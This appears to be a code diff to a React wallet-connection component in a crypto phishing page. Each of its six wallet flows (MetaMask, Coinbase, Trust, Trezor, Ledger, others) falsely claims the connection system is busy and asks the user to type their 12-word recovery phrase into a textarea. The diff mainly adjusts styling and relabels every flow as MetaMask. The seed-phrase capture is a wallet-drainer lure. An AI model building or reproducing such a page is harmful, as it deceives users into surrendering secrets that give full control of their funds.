@@ -22,15 +22,15 @@ import ledgerLage from "@/assets/wallets/lageImg/images.png"
 import otherWalletsLage from "@/assets/wallets/Group6.png"
 import walletImg from "@/assets/wallets/lageImg/Frame.png"
 import { TfiReload } from "react-icons/tfi";
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
-import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
-import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
 import useMetaMask from '@/hooks/useMetaMask';
 import useCoinbase from '@/hooks/useCoinbase';
 import useTrust from '@/hooks/Trust';
 import useTrezor from '@/hooks/Trezor';
 import useLedger from '@/hooks/Ledger';
 import useOtherWallet from '@/hooks/OtherWallet';
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
+import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
 
 const Connect = () => {
   const [show, setShow] = useState(false);
@@ -125,7 +125,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
-                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>
 
                                                 <button onClick={handleMetaMaskNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
@@ -135,7 +135,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                 <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
@@ -149,13 +149,13 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                                 <p className="text-start mt-6">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-2 mb-8" />
-                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
+                                                <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                               </div>
                                             </CarouselItem>
                                           </CarouselContent>
@@ -187,16 +187,16 @@ const Connect = () => {
                                           <CarouselContent>
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                               <div>
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
-                                                <img src={coinbaseLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
-                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Coinbase...</p>
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
+                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                               </div>
                                             </CarouselItem>
 
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
-                                                <img src={coinbaseLage} alt="Image" className="w-[100px] mx-auto mt-14 mb-5" />
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[100px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>
 
                                                 <button onClick={handleCoinbaseNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
@@ -206,7 +206,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                 <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
@@ -220,13 +220,13 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                                 <p className="text-start mt-6">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-2 mb-8" />
-                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
+                                                <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                               </div>
                                             </CarouselItem>
                                           </CarouselContent>
@@ -259,16 +259,16 @@ const Connect = () => {
                                           <CarouselContent>
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                               <div>
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
-                                                <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
-                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Trust...</p>
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
+                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                               </div>
                                             </CarouselItem>
 
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
-                                                <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>
 
                                                 <button onClick={handleTrustNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
@@ -278,7 +278,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                 <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
@@ -292,13 +292,13 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                                 <p className="text-start mt-6">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-2 mb-8" />
-                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
+                                                <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                               </div>
                                             </CarouselItem>
                                           </CarouselContent>
@@ -330,16 +330,16 @@ const Connect = () => {
                                           <CarouselContent>
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                               <div>
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
-                                                <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
-                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Trezor...</p>
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
+                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                               </div>
                                             </CarouselItem>
 
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
-                                                <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>
 
                                                 <button onClick={handleTrezorNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
@@ -349,7 +349,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                 <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
@@ -363,13 +363,13 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                                 <p className="text-start mt-6">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-2 mb-8" />
-                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
+                                                <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                               </div>
                                             </CarouselItem>
                                           </CarouselContent>
@@ -401,16 +401,16 @@ const Connect = () => {
                                           <CarouselContent>
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                               <div>
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
-                                                <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
-                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Ledger...</p>
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
+                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                               </div>
                                             </CarouselItem>
 
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
-                                                <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>
 
                                                 <button onClick={handleLedgerNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
@@ -420,7 +420,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                 <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
@@ -434,13 +434,13 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                                 <p className="text-start mt-6">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-2 mb-8" />
-                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
+                                                <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                               </div>
                                             </CarouselItem>
                                           </CarouselContent>
@@ -472,16 +472,16 @@ const Connect = () => {
                                           <CarouselContent>
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                               <div>
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
-                                                <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
-                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Other Wallets...</p>
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5" />
+                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                               </div>
                                             </CarouselItem>
 
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
-                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
-                                                <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
+                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>
 
                                                 <button onClick={handleOtherWalletNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
@@ -491,7 +491,7 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-24 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                 <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>
 
@@ -505,13 +505,13 @@ const Connect = () => {
                                             <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                               <div className="w-full">
                                                 <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
-                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5" />
+                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-20 mb-5" />
                                                 <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                 <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>
 
                                                 <p className="text-start mt-6">12 Word phrase</p>
-                                                <Textarea rows={4} className="mt-2 mb-8" />
-                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
+                                                <Textarea rows={4} className="mt-2 mb-8 focus:border-[#6c6d7591] focus-visible:ring-0" />
+                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                               </div>
                                             </CarouselItem>
                                           </CarouselContent>
